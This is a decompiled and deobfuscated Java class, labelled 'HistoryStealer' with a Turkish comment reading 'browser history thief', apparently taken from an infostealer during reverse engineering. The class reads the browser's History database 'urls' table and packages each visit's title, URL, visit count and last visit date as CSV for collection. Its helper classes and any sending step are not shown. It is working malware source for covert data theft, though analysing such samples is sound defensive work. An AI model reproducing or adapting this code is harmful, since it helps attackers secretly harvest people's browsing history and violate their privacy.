/*\n * ========================================\n * DEOBFUSCATED: HistoryStealer.java\n * Original: c/m.java\n * ----------------------------------------\n * Tarayıcı geçmişi hırsızı\n * ========================================\n */\n\n/*
 * Decompiled with CFR 0.152.
 */
package c;

import c.f;
import c.j;
import c.m$Visit;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;

public final class m
extends j {
    public static final String CSV_HEADER = "e,Title,URL,Visit Count,Last Visit Date\n";
    private final List<m$Visit> e = new ArrayList<m$Visit>();

    public m(f f2) {
        super(f2, "History", "urls");
        this.findResultSets();
    }

    @Override
    public void onResultSetFound(ResultSet resultSet) {
        try {
            this.e.add(new m$Visit(resultSet));
        }
        catch (SQLException sQLException) {
            // empty catch block
        }
    }

    @Override
    public String toCsvColumn() {
        return super.toCsvColumn(this.e);
    }

    public int getCount() {
        return this.e.size();
    }
}

